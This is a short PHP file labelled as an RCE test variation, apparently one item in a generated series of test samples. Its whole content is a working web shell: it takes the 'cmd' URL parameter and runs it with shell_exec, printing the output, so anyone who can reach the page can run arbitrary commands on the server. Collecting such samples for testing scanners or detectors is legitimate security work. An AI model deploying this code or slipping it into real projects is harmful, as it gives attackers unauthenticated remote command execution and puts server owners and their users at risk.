<?php
// RCE test variation #426
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>